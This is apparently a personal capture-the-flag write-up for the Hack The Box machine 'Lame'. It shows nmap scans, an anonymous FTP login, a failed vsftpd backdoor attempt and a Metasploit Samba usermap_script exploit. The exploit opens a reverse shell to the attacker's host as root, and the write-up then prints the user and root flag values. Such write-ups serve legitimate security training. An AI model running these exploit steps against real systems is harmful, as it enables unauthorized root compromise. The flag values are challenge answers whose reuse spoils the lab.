#Lame (Linux box)
```
Joe Vinyard | 20200605
```
#IP Address
```
export IP=10.10.10.3
```

#Initial nmap scan
```
# Nmap 7.80 scan initiated Fri Jun  5 19:14:16 2020 as: nmap -Pn -sC -sV -oN nmap/initial 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.033s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.11
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3d00h55m20s, deviation: 2h49m46s, median: -3d02h55m23s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-06-02T16:19:17-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  5 19:15:14 2020 -- 1 IP address (1 host up) scanned in 57.88 seconds



Anon FTP login allowed
```
#Vuln nmap scan
```
# Nmap 7.80 scan initiated Fri Jun  5 19:14:44 2020 as: nmap --script vuln -sC -sV -Pn -oN nmap/vuln 10.10.10.3
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.3
Host is up (0.034s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:4.7p1: 
|     	CVE-2010-4478	7.5	https://vulners.com/cve/CVE-2010-4478
|     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
|     	CVE-2016-10708	5.0	https://vulners.com/cve/CVE-2016-10708
|     	CVE-2010-4755	4.0	https://vulners.com/cve/CVE-2010-4755
|_    	CVE-2008-5161	2.6	https://vulners.com/cve/CVE-2008-5161
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  5 19:16:48 2020 -- 1 IP address (1 host up) scanned in 123.91 seconds

```
#Vulnerabilities
```
anon FTP login


joe@kali:~/ctf/htb/Lame$ ftp $IP 
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:joe): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

#Searching for FTP vulnerabilites related to vsFTPd 2.3.4
```
joe@kali:~/ctf/htb/Lame$ searchsploit ftp | grep unix


vsftpd 2.3.4 - Backdoor Command Execution (Meta | unix/remote/17491.rb

```

#Metasploit
```
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 > use exploit/unix/ftp/vsftpd_234_backdoor 
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run


[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.


boo...onto the next idea.

I knew ssh was open, but couldn't remember the other open ports off the top of my head.

joe@kali:~/ctf/htb/Lame/nmap$ cat initial | grep open
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Searching for samba exploits specifically for Unix

joe@kali:~/ctf/htb/Lame/nmap$ searchsploit samba | grep unix
Samba 2.0.7 - SWAT Logging Failure                                                                                                      | unix/remote/20340.c
Samba 2.0.x/2.2 - Arbitrary File Creation                                                                                               | unix/remote/20968.txt
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                                              | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                                              | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                                              | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                                              | unix/remote/22471.txt
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                                 | unix/remote/22356.c
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                        | unix/remote/16320.rb
joe@kali:~/ctf/htb/Lame/nmap$ 

Last one looks promising since the version number of samba matches the version of samba running on port 445.

445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                        | unix/remote/16320.rb

pull up metasploit 

msf5 > search usermap

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


msf5 > use exploit/multi/samba/usermap_script 
msf5 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > run


got a shell (albeit a really crappy one)

[*] Started reverse TCP double handler on 10.10.14.11:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo CsLUgcBhWQNbnXbx;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "CsLUgcBhWQNbnXbx\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.11:4444 -> 10.10.10.3:57007) at 2020-06-05 20:22:00 -0400

whoami
root

easily remedied thanks to python

python -c 'import pty; pty.spawn("/bin/sh")'
sh-3.2# 


Searching for root.txt and user.txt flags

sh-3.2# ls
ls
bin    dev   initrd	 lost+found  nohup.out	root  sys  var
boot   etc   initrd.img  media	     opt	sbin  tmp  vmlinuz
cdrom  home  lib	 mnt	     proc	srv   usr
sh-3.2# find /* | grep root*.txt
find /* | grep root*.txt
/root/root.txt
sh-3.2# find /* | grep user*.txt
find /* | grep user*.txt
/home/makis/user.txt
/usr/share/doc/fontconfig-config/fontconfig-user.txt.gz
sh-3.2# 

Printing out contents of both user and root flags

sh-3.2# cat /home/makis/user.txt
cat /home/makis/user.txt
69454a937d94f5f0225ea00acd2e84c5
sh-3.2# cat /root/root.txt
cat /root/root.txt
92caac3be140ef409e45721348a4e9df
```
